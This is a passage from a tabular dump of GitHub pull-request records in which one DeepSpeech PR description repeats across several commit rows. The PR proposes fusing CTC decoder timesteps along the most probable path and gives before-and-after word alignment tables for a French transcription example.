 WordScoreRange(word=dans /dans/, score=None, ranges=((450, 456),)),
 WordScoreRange(word=les /les/, score=None, ranges=((458, 462),)),
 WordScoreRange(word=pages /pages/, score=None, ranges=((465, 479),)),
 WordScoreRange(word=sportives /sportives/, score=None, ranges=((487, 507),)),
 WordScoreRange(word=de /de/, score=None, ranges=((509, 511),)),
 WordScoreRange(word=vos /vos/, score=None, ranges=((513, 519),)),
 WordScoreRange(word=journaux /journaux/, score=None, ranges=((521, 533),)),
 WordScoreRange(word=télévisés /télévisés/, score=None, ranges=((535, 562),)),
 WordScoreRange(word=deux /deux/, score=None, ranges=((568, 576),)),
 WordScoreRange(word=épreuves /épreuves/, score=None, ranges=((581, 618),)),
 WordScoreRange(word=aujourd'hui /aujourd'hui/, score=None, ranges=((629, 654),)),
 WordScoreRange(word=on /onoro/, score=None, ranges=((662, 680),)),
 WordScoreRange(word=a /am/, score=None, ranges=((685, 699),)),
 WordScoreRange(word=santa /santa/, score=None, ranges=((703, 726),)),
 WordScoreRange(word=caterina /qaterina/, score=None, ranges=((729, 761),)),
 WordScoreRange(word=premier /prmier/, score=None, ranges=((768, 783),)),
 WordScoreRange(word=salon /salom/, score=None, ranges=((785, 803),)),
 WordScoreRange(word=géant /géant/, score=None, ranges=((808, 820),)),
 WordScoreRange(word=de /de/, score=None, ranges=((822, 824),)),
 WordScoreRange(word=la /l/, score=None, ranges=((826, 829),)),
 WordScoreRange(word=coupe /coupe/, score=None, ranges=((833, 842),)),
 WordScoreRange(word=du /d/, score=None, ranges=((843, 846),)),
 WordScoreRange(word=monde /mond/, score=None, ranges=((850, 858),))]
```

We can see that before this PR, there are 17 words where timesteps are too early (about one letter shift, it is visible at the end but not at the begining of words because I have trimed spaces).
After this PR, the fit is almost prefect. For some reason, there are still 3 remaining errors, all in the 4 last words.",godefv,18540039,2020-08-25T11:03:55Z,COLLABORATOR,True,277,31,10,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,14bd9033d6b133c1157eb737e7257a7984b79a51,"Revert ""PR #3279 - removed unrelated code""

This reverts commit 78c4ef17b11fe681702cb0619a0b938a0b59f5bd."
566,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3279,3279,"The CTC decoder timesteps now corresponds to the timesteps of the most probable CTC path, instead of the earliest timesteps of all possible paths.","This follows the issue #3180 .

I suggest a new way of handling timesteps produced by the CTC decoder. There is no strange heuristic, and I think the logic is clear : when fusing two different paths leading to the same prefix, not only fuse the probabilities (the probabilities are added), but also fuse the timestep sequences (for the last letter in the sequence, choose the timestep from the most probable path).

The place where two different paths leading to the same prefix are fused are the places where `log_sum_exp` is called, because this function fuses the probabilities. So, timesteps would now be fused at the same places.

The other change is that each `PathTrie` node would now store the full sequence of timesteps. This is because one prefix can be an ancestor of another and their timesteps on a given node can differ. Having the full sequence of timesteps in each node, we have no need to duplicate a node with different timesteps, and it is much simpler like that. 
Moreover, it makes sense to store the *full* sequence of timesteps, because the *combined* probabilities are also stored there. The total probability is not the sum of the probability of each output token, and, in the same way, the correct sequence of timesteps is not the concatenation of the timestep of each output token.

Since I need to compare the probability of different paths (to keep the timesteps of the most probable one), it is important to compare paths of the same length (eg. paths from the beginning up to the current time). So, exactly the same way as it is done for the probabilities, I need to know the timesteps of the previous time, and store the timesteps of the current time separately.

In the end, timesteps are handled in a way very similar to the way probabilities are handled.

### Results on an example
To evaluate the resulting timesteps, I first take the argmax of my logits. In my example, it gives :
```
tou_________________________________________________ss  les  _a__mouurreuux  de  se_p_ort__ diiivverrr_  ss'enn__ _r_é___j_uuii__rr__on_t____    aa_v_eecc_   l''aap__p_rroo___chhee_____    de_  ll'hhi__v_e_rr____  et   la   rre__p_rri_ssee  dee  la  c_ouppee ddu  mon_deee      ss__kk_i___      less    ii_mm_a__ggees_   de   _g_ll_i_ss__ssee____________________             ree__t_rrou_vveennt    uunee    __pllaa___cee____      de    _cchhooixx__  d_ans_  lles  _pp_a____ggeess        ssspp_o_r_t_ii_vees_  de  v_o_s_ _jourrnnaauxx  ttéé_l_é___v_ii___ss_é__s__      ddeeu_x_   __é___pprreeuu_vvees___________________          _auu_jjoouurrdd''hhuuii___       _o____nno___rr_o_____d__a___mm________ ___s___a_n______t__a______  _q__a___tt__e___rr_i____n__a_____     __p_r____mmie_r__  s__a___l__o___m___    _g_é____ant__  de   lla  _c_ou_ppee  ddu   m_on___deee____________________________________________________
```
As the logits are the only input of the decoder, I base my evaluation on them instead of comparing with the audio file directly. It is known that the CTC loss does not guarantee alignment between the audio file and the logits, so the best thing the decoder can do is to fit the logits as best as it can. This is reasonable because, in practice, the logits are aligned quite well with the audio file.

Then, for each word, I take the part of the logits corresponding to the output timesteps, take the argmax (as said above), and print the corresponding decoded text. 

Finally, I assume that good timesteps should lead to a good match between the word and its corresponding text decoded from the argmax of the logits.

Before this PR, the result in my example is (text between slashes is from the logits argmax, spaces are trimmed) : 
```
[WordScoreRange(word=tous /tou/, score=None, ranges=((0, 4),)),   
 WordScoreRange(word=les /les/, score=None, ranges=((55, 59),)),       
 WordScoreRange(word=amoureux /amoureu/, score=None, ranges=((60, 74),)),
 WordScoreRange(word=de /d/, score=None, ranges=((75, 78),)),           
 WordScoreRange(word=sport /seport/, score=None, ranges=((80, 90),)),           
 WordScoreRange(word=divers /diver/, score=None, ranges=((91, 102),)),
 WordScoreRange(word=s'en /s'en/, score=None, ranges=((103, 111),)),  
 WordScoreRange(word=réjouiront /réjuiron/, score=None, ranges=((112, 136),)),
 WordScoreRange(word=avec /avec/, score=None, ranges=((141, 153),)),  
 WordScoreRange(word=l'approche /l'approche/, score=None, ranges=((155, 179),)),
 WordScoreRange(word=de /de/, score=None, ranges=((185, 191),)),  
 WordScoreRange(word=l'hiver /l'hive/, score=None, ranges=((192, 206),)),
 WordScoreRange(word=et /e/, score=None, ranges=((208, 215),)),
 WordScoreRange(word=la /la/, score=None, ranges=((217, 221),)),
 WordScoreRange(word=reprise /reprise/, score=None, ranges=((222, 238),)),
 WordScoreRange(word=de /de/, score=None, ranges=((240, 243),)),
 WordScoreRange(word=la /la/, score=None, ranges=((244, 248),)),
 WordScoreRange(word=coupe /coupe/, score=None, ranges=((249, 257),)),
 WordScoreRange(word=du /d/, score=None, ranges=((258, 261),)),
 WordScoreRange(word=monde /monde/, score=None, ranges=((263, 270),)),
 WordScoreRange(word=de /e/, score=None, ranges=((271, 275),)),
 WordScoreRange(word=ski /ski/, score=None, ranges=((276, 286),)),
 WordScoreRange(word=les /les/, score=None, ranges=((290, 298),)),
 WordScoreRange(word=images /image/, score=None, ranges=((300, 316),)),
 WordScoreRange(word=de /d/, score=None, ranges=((318, 322),)),
 WordScoreRange(word=glisse /glisse/, score=None, ranges=((324, 341),)),
 WordScoreRange(word=retrouvent /retrouvent/, score=None, ranges=((363, 394),)),
 WordScoreRange(word=une /une/, score=None, ranges=((395, 402),)),
 WordScoreRange(word=place /place/, score=None, ranges=((404, 419),)),
 WordScoreRange(word=de /de/, score=None, ranges=((425, 432),)),
 WordScoreRange(word=choix /choix/, score=None, ranges=((433, 445),)),
 WordScoreRange(word=dans /dans/, score=None, ranges=((448, 455),)),
 WordScoreRange(word=les /les/, score=None, ranges=((457, 462),)),
 WordScoreRange(word=pages /pages/, score=None, ranges=((463, 478),)),
 WordScoreRange(word=sportives /sportives/, score=None, ranges=((479, 506),)),
 WordScoreRange(word=de /de/, score=None, ranges=((508, 511),)),
 WordScoreRange(word=vos /vos/, score=None, ranges=((512, 518),)),
 WordScoreRange(word=journaux /journaux/, score=None, ranges=((520, 532),)),
 WordScoreRange(word=télévisés /télévisé/, score=None, ranges=((533, 559),)),
 WordScoreRange(word=deux /deux/, score=None, ranges=((563, 575),)),
 WordScoreRange(word=épreuves /épreuve/, score=None, ranges=((577, 598),)),
 WordScoreRange(word=aujourd'hui /aujourd'hu/, score=None, ranges=((618, 649),)),
 WordScoreRange(word=on /o/, score=None, ranges=((654, 665),)),
 WordScoreRange(word=a /am/, score=None, ranges=((685, 699),)),
 WordScoreRange(word=santa /santa/, score=None, ranges=((703, 726),)),
 WordScoreRange(word=caterina /qaterina/, score=None, ranges=((729, 756),)),
 WordScoreRange(word=premier /prmier/, score=None, ranges=((762, 783),)),
 WordScoreRange(word=salon /salom/, score=None, ranges=((785, 803),)),
 WordScoreRange(word=géant /géant/, score=None, ranges=((805, 818),)),
 WordScoreRange(word=de /d/, score=None, ranges=((819, 823),)),
 WordScoreRange(word=la /l/, score=None, ranges=((825, 829),)),
 WordScoreRange(word=coupe /coupe/, score=None, ranges=((831, 841),)),
 WordScoreRange(word=du /d/, score=None, ranges=((842, 846),)),
 WordScoreRange(word=monde /mon/, score=None, ranges=((848, 857),))]
```

After this PR, the result in my example is : 
```
[WordScoreRange(word=tous /tous/, score=None, ranges=((0, 54),)), 
 WordScoreRange(word=les /les/, score=None, ranges=((56, 59),)),        
 WordScoreRange(word=amoureux /amoureux/, score=None, ranges=((62, 75),)),
 WordScoreRange(word=de /de/, score=None, ranges=((77, 79),)),          
 WordScoreRange(word=sport /seport/, score=None, ranges=((81, 91),)),           
 WordScoreRange(word=divers /diver/, score=None, ranges=((92, 103),)),
 WordScoreRange(word=s'en /s'en/, score=None, ranges=((105, 113),)),  
 WordScoreRange(word=réjouiront /réjuiront/, score=None, ranges=((114, 140),)),
 WordScoreRange(word=avec /avec/, score=None, ranges=((145, 155),)),  
 WordScoreRange(word=l'approche /l'approche/, score=None, ranges=((158, 185),)),
 WordScoreRange(word=de /de/, score=None, ranges=((189, 192),)),  
 WordScoreRange(word=l'hiver /l'hiver/, score=None, ranges=((194, 212),)),
 WordScoreRange(word=et /et/, score=None, ranges=((214, 216),)),                                                               
 WordScoreRange(word=la /la/, score=None, ranges=((219, 221),)),
 WordScoreRange(word=reprise /reprise/, score=None, ranges=((224, 239),)),                                                                                                                         
 WordScoreRange(word=de /de/, score=None, ranges=((241, 244),)),            
 WordScoreRange(word=la /la/, score=None, ranges=((246, 248),)),              
 WordScoreRange(word=coupe /coupe/, score=None, ranges=((250, 258),)),
 WordScoreRange(word=du /du/, score=None, ranges=((259, 262),)),            
 WordScoreRange(word=monde /monde/, score=None, ranges=((264, 272),)),
 WordScoreRange(word=de //, score=None, ranges=((273, 275),)),
 WordScoreRange(word=ski /ski/, score=None, ranges=((278, 289),)),
 WordScoreRange(word=les /les/, score=None, ranges=((295, 299),)),
 WordScoreRange(word=images /images/, score=None, ranges=((303, 318),)),
 WordScoreRange(word=de /de/, score=None, ranges=((321, 323),)),
 WordScoreRange(word=glisse /glisse/, score=None, ranges=((327, 362),)),
 WordScoreRange(word=retrouvent /retrouvent/, score=None, ranges=((375, 394),)),
 WordScoreRange(word=une /une/, score=None, ranges=((398, 403),)),
 WordScoreRange(word=place /place/, score=None, ranges=((409, 424),)),
 WordScoreRange(word=de /de/, score=None, ranges=((430, 432),)),
 WordScoreRange(word=choix /choix/, score=None, ranges=((437, 448),)),
 WordScoreRange(word=dans /dans/, score=None, ranges=((450, 456),)),
 WordScoreRange(word=les /les/, score=None, ranges=((458, 462),)),
 WordScoreRange(word=pages /pages/, score=None, ranges=((465, 479),)),
 WordScoreRange(word=sportives /sportives/, score=None, ranges=((487, 507),)),
 WordScoreRange(word=de /de/, score=None, ranges=((509, 511),)),
 WordScoreRange(word=vos /vos/, score=None, ranges=((513, 519),)),
 WordScoreRange(word=journaux /journaux/, score=None, ranges=((521, 533),)),
 WordScoreRange(word=télévisés /télévisés/, score=None, ranges=((535, 562),)),
 WordScoreRange(word=deux /deux/, score=None, ranges=((568, 576),)),
 WordScoreRange(word=épreuves /épreuves/, score=None, ranges=((581, 618),)),
 WordScoreRange(word=aujourd'hui /aujourd'hui/, score=None, ranges=((629, 654),)),
 WordScoreRange(word=on /onoro/, score=None, ranges=((662, 680),)),
 WordScoreRange(word=a /am/, score=None, ranges=((685, 699),)),
 WordScoreRange(word=santa /santa/, score=None, ranges=((703, 726),)),
 WordScoreRange(word=caterina /qaterina/, score=None, ranges=((729, 761),)),
 WordScoreRange(word=premier /prmier/, score=None, ranges=((768, 783),)),
 WordScoreRange(word=salon /salom/, score=None, ranges=((785, 803),)),
 WordScoreRange(word=géant /géant/, score=None, ranges=((808, 820),)),
 WordScoreRange(word=de /de/, score=None, ranges=((822, 824),)),
 WordScoreRange(word=la /l/, score=None, ranges=((826, 829),)),
 WordScoreRange(word=coupe /coupe/, score=None, ranges=((833, 842),)),
 WordScoreRange(word=du /d/, score=None, ranges=((843, 846),)),
 WordScoreRange(word=monde /mond/, score=None, ranges=((850, 858),))]
```

We can see that before this PR, there are 17 words where timesteps are too early (about one letter shift, it is visible at the end but not at the begining of words because I have trimed spaces).
After this PR, the fit is almost prefect. For some reason, there are still 3 remaining errors, all in the 4 last words.",godefv,18540039,2020-08-25T11:03:55Z,COLLABORATOR,True,277,31,10,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1fa2e4ebccd6102b5e4ff837147854a2c0369f72,PR #3279 - Fixed buggy timestep tree root
567,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3279,3279,"The CTC decoder timesteps now corresponds to the timesteps of the most probable CTC path, instead of the earliest timesteps of all possible paths.","This follows the issue #3180 .

I suggest a new way of handling timesteps produced by the CTC decoder. There is no strange heuristic, and I think the logic is clear : when fusing two different paths leading to the same prefix, not only fuse the probabilities (the probabilities are added), but also fuse the timestep sequences (for the last letter in the sequence, choose the timestep from the most probable path).

The place where two different paths leading to the same prefix are fused are the places where `log_sum_exp` is called, because this function fuses the probabilities. So, timesteps would now be fused at the same places.

The other change is that each `PathTrie` node would now store the full sequence of timesteps. This is because one prefix can be an ancestor of another and their timesteps on a given node can differ. Having the full sequence of timesteps in each node, we have no need to duplicate a node with different timesteps, and it is much simpler like that. 
Moreover, it makes sense to store the *full* sequence of timesteps, because the *combined* probabilities are also stored there. The total probability is not the sum of the probability of each output token, and, in the same way, the correct sequence of timesteps is not the concatenation of the timestep of each output token.

Since I need to compare the probability of different paths (to keep the timesteps of the most probable one), it is important to compare paths of the same length (eg. paths from the beginning up to the current time). So, exactly the same way as it is done for the probabilities, I need to know the timesteps of the previous time, and store the timesteps of the current time separately.

In the end, timesteps are handled in a way very similar to the way probabilities are handled.

### Results on an example
To evaluate the resulting timesteps, I first take the argmax of my logits. In my example, it gives :
```
tou_________________________________________________ss  les  _a__mouurreuux  de  se_p_ort__ diiivverrr_  ss'enn__ _r_é___j_uuii__rr__on_t____    aa_v_eecc_   l''aap__p_rroo___chhee_____    de_  ll'hhi__v_e_rr____  et   la   rre__p_rri_ssee  dee  la  c_ouppee ddu  mon_deee      ss__kk_i___      less    ii_mm_a__ggees_   de   _g_ll_i_ss__ssee____________________             ree__t_rrou_vveennt    uunee    __pllaa___cee____      de    _cchhooixx__  d_ans_  lles  _pp_a____ggeess        ssspp_o_r_t_ii_vees_  de  v_o_s_ _jourrnnaauxx  ttéé_l_é___v_ii___ss_é__s__      ddeeu_x_   __é___pprreeuu_vvees___________________          _auu_jjoouurrdd''hhuuii___       _o____nno___rr_o_____d__a___mm________ ___s___a_n______t__a______  _q__a___tt__e___rr_i____n__a_____     __p_r____mmie_r__  s__a___l__o___m___    _g_é____ant__  de   lla  _c_ou_ppee  ddu   m_on___deee____________________________________________________
```
As the logits are the only input of the decoder, I base my evaluation on them instead of comparing with the audio file directly. It is known that the CTC loss does not guarantee alignment between the audio file and the logits, so the best thing the decoder can do is to fit the logits as best as it can. This is reasonable because, in practice, the logits are aligned quite well with the audio file.

Then, for each word, I take the part of the logits corresponding to the output timesteps, take the argmax (as said above), and print the corresponding decoded text. 

Finally, I assume that good timesteps should lead to a good match between the word and its corresponding text decoded from the argmax of the logits.

Before this PR, the result in my example is (text between slashes is from the logits argmax, spaces are trimmed) : 
```
[WordScoreRange(word=tous /tou/, score=None, ranges=((0, 4),)),   
 WordScoreRange(word=les /les/, score=None, ranges=((55, 59),)),       
 WordScoreRange(word=amoureux /amoureu/, score=None, ranges=((60, 74),)),
 WordScoreRange(word=de /d/, score=None, ranges=((75, 78),)),           
 WordScoreRange(word=sport /seport/, score=None, ranges=((80, 90),)),           
 WordScoreRange(word=divers /diver/, score=None, ranges=((91, 102),)),
 WordScoreRange(word=s'en /s'en/, score=None, ranges=((103, 111),)),  
 WordScoreRange(word=réjouiront /réjuiron/, score=None, ranges=((112, 136),)),
 WordScoreRange(word=avec /avec/, score=None, ranges=((141, 153),)),  
 WordScoreRange(word=l'approche /l'approche/, score=None, ranges=((155, 179),)),
 WordScoreRange(word=de /de/, score=None, ranges=((185, 191),)),  
 WordScoreRange(word=l'hiver /l'hive/, score=None, ranges=((192, 206),)),
 WordScoreRange(word=et /e/, score=None, ranges=((208, 215),)),
 WordScoreRange(word=la /la/, score=None, ranges=((217, 221),)),
 WordScoreRange(word=reprise /reprise/, score=None, ranges=((222, 238),)),
 WordScoreRange(word=de /de/, score=None, ranges=((240, 243),)),
 WordScoreRange(word=la /la/, score=None, ranges=((244, 248),)),
 WordScoreRange(word=coupe /coupe/, score=None, ranges=((249, 257),)),
 WordScoreRange(word=du /d/, score=None, ranges=((258, 261),)),
 WordScoreRange(word=monde /monde/, score=None, ranges=((263, 270),)),
 WordScoreRange(word=de /e/, score=None, ranges=((271, 275),)),
 WordScoreRange(word=ski /ski/, score=None, ranges=((276, 286),)),
 WordScoreRange(word=les /les/, score=None, ranges=((290, 298),)),
 WordScoreRange(word=images /image/, score=None, ranges=((300, 316),)),
 WordScoreRange(word=de /d/, score=None, ranges=((318, 322),)),
 WordScoreRange(word=glisse /glisse/, score=None, ranges=((324, 341),)),
 WordScoreRange(word=retrouvent /retrouvent/, score=None, ranges=((363, 394),)),
 WordScoreRange(word=une /une/, score=None, ranges=((395, 402),)),
 WordScoreRange(word=place /place/, score=None, ranges=((404, 419),)),
 WordScoreRange(word=de /de/, score=None, ranges=((425, 432),)),
 WordScoreRange(word=choix /choix/, score=None, ranges=((433, 445),)),
 WordScoreRange(word=dans /dans/, score=None, ranges=((448, 455),)),
 WordScoreRange(word=les /les/, score=None, ranges=((457, 462),)),
 WordScoreRange(word=pages /pages/, score=None, ranges=((463, 478),)),
 WordScoreRange(word=sportives /sportives/, score=None, ranges=((479, 506),)),
 WordScoreRange(word=de /de/, score=None, ranges=((508, 511),)),
 WordScoreRange(word=vos /vos/, score=None, ranges=((512, 518),)),
 WordScoreRange(word=journaux /journaux/, score=None, ranges=((520, 532),)),
 WordScoreRange(word=télévisés /télévisé/, score=None, ranges=((533, 559),)),
 WordScoreRange(word=deux /deux/, score=None, ranges=((563, 575),)),
 WordScoreRange(word=épreuves /épreuve/, score=None, ranges=((577, 598),)),
 WordScoreRange(word=aujourd'hui /aujourd'hu/, score=None, ranges=((618, 649),)),
 WordScoreRange(word=on /o/, score=None, ranges=((654, 665),)),
 WordScoreRange(word=a /am/, score=None, ranges=((685, 699),)),
 WordScoreRange(word=santa /santa/, score=None, ranges=((703, 726),)),
 WordScoreRange(word=caterina /qaterina/, score=None, ranges=((729, 756),)),
 WordScoreRange(word=premier /prmier/, score=None, ranges=((762, 783),)),
 WordScoreRange(word=salon /salom/, score=None, ranges=((785, 803),)),
 WordScoreRange(word=géant /géant/, score=None, ranges=((805, 818),)),
 WordScoreRange(word=de /d/, score=None, ranges=((819, 823),)),
 WordScoreRange(word=la /l/, score=None, ranges=((825, 829),)),
 WordScoreRange(word=coupe /coupe/, score=None, ranges=((831, 841),)),
 WordScoreRange(word=du /d/, score=None, ranges=((842, 846),)),
 WordScoreRange(word=monde /mon/, score=None, ranges=((848, 857),))]
```

After this PR, the result in my example is : 
```
[WordScoreRange(word=tous /tous/, score=None, ranges=((0, 54),)), 
 WordScoreRange(word=les /les/, score=None, ranges=((56, 59),)),        
 WordScoreRange(word=amoureux /amoureux/, score=None, ranges=((62, 75),)),
 WordScoreRange(word=de /de/, score=None, ranges=((77, 79),)),          
 WordScoreRange(word=sport /seport/, score=None, ranges=((81, 91),)),           
 WordScoreRange(word=divers /diver/, score=None, ranges=((92, 103),)),
 WordScoreRange(word=s'en /s'en/, score=None, ranges=((105, 113),)),  
 WordScoreRange(word=réjouiront /réjuiront/, score=None, ranges=((114, 140),)),
 WordScoreRange(word=avec /avec/, score=None, ranges=((145, 155),)),  
 WordScoreRange(word=l'approche /l'approche/, score=None, ranges=((158, 185),)),
 WordScoreRange(word=de /de/, score=None, ranges=((189, 192),)),  
 WordScoreRange(word=l'hiver /l'hiver/, score=None, ranges=((194, 212),)),
 WordScoreRange(word=et /et/, score=None, ranges=((214, 216),)),                                                               
 WordScoreRange(word=la /la/, score=None, ranges=((219, 221),)),
 WordScoreRange(word=reprise /reprise/, score=None, ranges=((224, 239),)),                                                                                                                         
 WordScoreRange(word=de /de/, score=None, ranges=((241, 244),)),            
 WordScoreRange(word=la /la/, score=None, ranges=((246, 248),)),              
 WordScoreRange(word=coupe /coupe/, score=None, ranges=((250, 258),)),
 WordScoreRange(word=du /du/, score=None, ranges=((259, 262),)),            
 WordScoreRange(word=monde /monde/, score=None, ranges=((264, 272),)),
 WordScoreRange(word=de //, score=None, ranges=((273, 275),)),
 WordScoreRange(word=ski /ski/, score=None, ranges=((278, 289),)),
 WordScoreRange(word=les /les/, score=None, ranges=((295, 299),)),
 WordScoreRange(word=images /images/, score=None, ranges=((303, 318),)),
 WordScoreRange(word=de /de/, score=None, ranges=((321, 323),)),
 WordScoreRange(word=glisse /glisse/, score=None, ranges=((327, 362),)),
 WordScoreRange(word=retrouvent /retrouvent/, score=None, ranges=((375, 394),)),
 WordScoreRange(word=une /une/, score=None, ranges=((398, 403),)),
 WordScoreRange(word=place /place/, score=None, ranges=((409, 424),)),
 WordScoreRange(word=de /de/, score=None, ranges=((430, 432),)),
 WordScoreRange(word=choix /choix/, score=None, ranges=((437, 448),)),
 WordScoreRange(word=dans /dans/, score=None, ranges=((450, 456),)),
 WordScoreRange(word=les /les/, score=None, ranges=((458, 462),)),
 WordScoreRange(word=pages /pages/, score=None, ranges=((465, 479),)),
 WordScoreRange(word=sportives /sportives/, score=None, ranges=((487, 507),)),
 WordScoreRange(word=de /de/, score=None, ranges=((509, 511),)),
 WordScoreRange(word=vos /vos/, score=None, ranges=((513, 519),)),
 WordScoreRange(word=journaux /journaux/, score=None, ranges=((521, 533),)),
 WordScoreRange(word=télévisés /télévisés/, score=None, ranges=((535, 562),)),
 WordScoreRange(word=deux /deux/, score=None, ranges=((568, 576),)),
 WordScoreRange(word=épreuves /épreuves/, score=None, ranges=((581, 618),)),
 WordScoreRange(word=aujourd'hui /aujourd'hui/, score=None, ranges=((629, 654),)),
 WordScoreRange(word=on /onoro/, score=None, ranges=((662, 680),)),
 WordScoreRange(word=a /am/, score=None, ranges=((685, 699),)),
 WordScoreRange(word=santa /santa/, score=None, ranges=((703, 726),)),
 WordScoreRange(word=caterina /qaterina/, score=None, ranges=((729, 761),)),
 WordScoreRange(word=premier /prmier/, score=None, ranges=((768, 783),)),
 WordScoreRange(word=salon /salom/, score=None, ranges=((785, 803),)),
 WordScoreRange(word=géant /géant/, score=None, ranges=((808, 820),)),
 WordScoreRange(word=de /de/, score=None, ranges=((822, 824),)),
 WordScoreRange(word=la /l/, score=None, ranges=((826, 829),)),
 WordScoreRange(word=coupe /coupe/, score=None, ranges=((833, 842),)),
 WordScoreRange(word=du /d/, score=None, ranges=((843, 846),)),
 WordScoreRange(word=monde /mond/, score=None, ranges=((850, 858),))]
```

We can see that before this PR, there are 17 words where timesteps are too early (about one letter shift, it is visible at the end but not at the begining of words because I have trimed spaces).
After this PR, the fit is almost prefect. For some reason, there are still 3 remaining errors, all in the 4 last words.",godefv,18540039,2020-08-25T11:03:55Z,COLLABORATOR,True,277,31,10,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,23944b97dbdf739909a1eb88e8e40f65999677e7,PR #3279 - Made the timestep tree thread safe
568,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3279,3279,"The CTC decoder timesteps now corresponds to the timesteps of the most probable CTC path, instead of the earliest timesteps of all possible paths.","This follows the issue #3180 .

I suggest a new way of handling timesteps produced by the CTC decoder. There is no strange heuristic, and I think the logic is clear : when fusing two different paths leading to the same prefix, not only fuse the probabilities (the probabilities are added), but also fuse the timestep sequences (for the last letter in the sequence, choose the timestep from the most probable path).

The place where two different paths leading to the same prefix are fused are the places where `log_sum_exp` is called, because this function fuses the probabilities. So, timesteps would now be fused at the same places.

The other change is that each `PathTrie` node would now store the full sequence of timesteps. This is because one prefix can be an ancestor of another and their timesteps on a given node can differ. Having the full sequence of timesteps in each node, we have no need to duplicate a node with different timesteps, and it is much simpler like that. 
Moreover, it makes sense to store the *full* sequence of timesteps, because the *combined* probabilities are also stored there. The total probability is not the sum of the probability of each output token, and, in the same way, the correct sequence of timesteps is not the concatenation of the timestep of each output token.

Since I need to compare the probability of different paths (to keep the timesteps of the most probable one), it is important to compare paths of the same length (eg. paths from the beginning up to the current time). So, exactly the same way as it is done for the probabilities, I need to know the timesteps of the previous time, and store the timesteps of the current time separately.

In the end, timesteps are handled in a way very similar to the way probabilities are handled.

### Results on an example
To evaluate the resulting timesteps, I first take the argmax of my logits. In my example, it gives :
```
tou_________________________________________________ss  les  _a__mouurreuux  de  se_p_ort__ diiivverrr_  ss'enn__ _r_é___j_uuii__rr__on_t____    aa_v_eecc_   l''aap__p_rroo___chhee_____    de_  ll'hhi__v_e_rr____  et   la   rre__p_rri_ssee  dee  la  c_ouppee ddu  mon_deee      ss__kk_i___      less    ii_mm_a__ggees_   de   _g_ll_i_ss__ssee____________________             ree__t_rrou_vveennt    uunee    __pllaa___cee____      de    _cchhooixx__  d_ans_  lles  _pp_a____ggeess        ssspp_o_r_t_ii_vees_  de  v_o_s_ _jourrnnaauxx  ttéé_l_é___v_ii___ss_é__s__      ddeeu_x_   __é___pprreeuu_vvees___________________          _auu_jjoouurrdd''hhuuii___       _o____nno___rr_o_____d__a___mm________ ___s___a_n______t__a______  _q__a___tt__e___rr_i____n__a_____     __p_r____mmie_r__  s__a___l__o___m___    _g_é____ant__  de   lla  _c_ou_ppee  ddu   m_on___deee____________________________________________________
```
As the logits are the only input of the decoder, I base my evaluation on them instead of comparing with the audio file directly. It is known that the CTC loss does not guarantee alignment between the audio file and the logits, so the best thing the decoder can do is to fit the logits as best as it can. This is reasonable because, in practice, the logits are aligned quite well with the audio file.

Then, for each word, I take the part of the logits corresponding to the output timesteps, take the argmax (as said above), and print the corresponding decoded text. 

Finally, I assume that good timesteps should lead to a good match between the word and its corresponding text decoded from the argmax of the logits.

Before this PR, the result in my example is (text between slashes is from the logits argmax, spaces are trimmed) : 
```
[WordScoreRange(word=tous /tou/, score=None, ranges=((0, 4),)),   
 WordScoreRange(word=les /les/, score=None, ranges=((55, 59),)),       
 WordScoreRange(word=amoureux /amoureu/, score=None, ranges=((60, 74),)),
 WordScoreRange(word=de /d/, score=None, ranges=((75, 78),)),           
 WordScoreRange(word=sport /seport/, score=None, ranges=((80, 90),)),           
 WordScoreRange(word=divers /diver/, score=None, ranges=((91, 102),)),
 WordScoreRange(word=s'en /s'en/, score=None, ranges=((103, 111),)),  
 WordScoreRange(word=réjouiront /réjuiron/, score=None, ranges=((112, 136),)),
 WordScoreRange(word=avec /avec/, score=None, ranges=((141, 153),)),  
 WordScoreRange(word=l'approche /l'approche/, score=None, ranges=((155, 179),)),
 WordScoreRange(word=de /de/, score=None, ranges=((185, 191),)),  
 WordScoreRange(word=l'hiver /l'hive/, score=None, ranges=((192, 206),)),
 WordScoreRange(word=et /e/, score=None, ranges=((208, 215),)),
 WordScoreRange(word=la /la/, score=None, ranges=((217, 221),)),
 WordScoreRange(word=reprise /reprise/, score=None, ranges=((222, 238),)),
 WordScoreRange(word=de /de/, score=None, ranges=((240, 243),)),
 WordScoreRange(word=la /la/, score=None, ranges=((244, 248),)),
 WordScoreRange(word=coupe /coupe/, score=None, ranges=((249, 257),)),
 WordScoreRange(word=du /d/, score=None, ranges=((258, 261),)),
 WordScoreRange(word=monde /monde/, score=None, ranges=((263, 270),)),
 WordScoreRange(word=de /e/, score=None, ranges=((271, 275),)),
 WordScoreRange(word=ski /ski/, score=None, ranges=((276, 286),)),
 WordScoreRange(word=les /les/, score=None, ranges=((290, 298),)),
 WordScoreRange(word=images /image/, score=None, ranges=((300, 316),)),
 WordScoreRange(word=de /d/, score=None, ranges=((318, 322),)),
 WordScoreRange(word=glisse /glisse/, score=None, ranges=((324, 341),)),
 WordScoreRange(word=retrouvent /retrouvent/, score=None, ranges=((363, 394),)),
 WordScoreRange(word=une /une/, score=None, ranges=((395, 402),)),
 WordScoreRange(word=place /place/, score=None, ranges=((404, 419),)),
 WordScoreRange(word=de /de/, score=None, ranges=((425, 432),)),
 WordScoreRange(word=choix /choix/, score=None, ranges=((433, 445),)),
 WordScoreRange(word=dans /dans/, score=None, ranges=((448, 455),)),
 WordScoreRange(word=les /les/, score=None, ranges=((457, 462),)),
 WordScoreRange(word=pages /pages/, score=None, ranges=((463, 478),)),
 WordScoreRange(word=sportives /sportives/, score=None, ranges=((479, 506),)),
 WordScoreRange(word=de /de/, score=None, ranges=((508, 511),)),
 WordScoreRange(word=vos /vos/, score=None, ranges=((512, 518),)),
 WordScoreRange(word=journaux /journaux/, score=None, ranges=((520, 532),)),
 WordScoreRange(word=télévisés /télévisé/, score=None, ranges=((533, 559),)),
 WordScoreRange(word=deux /deux/, score=None, ranges=((563, 575),)),
 WordScoreRange(word=épreuves /épreuve/, score=None, ranges=((577, 598),)),
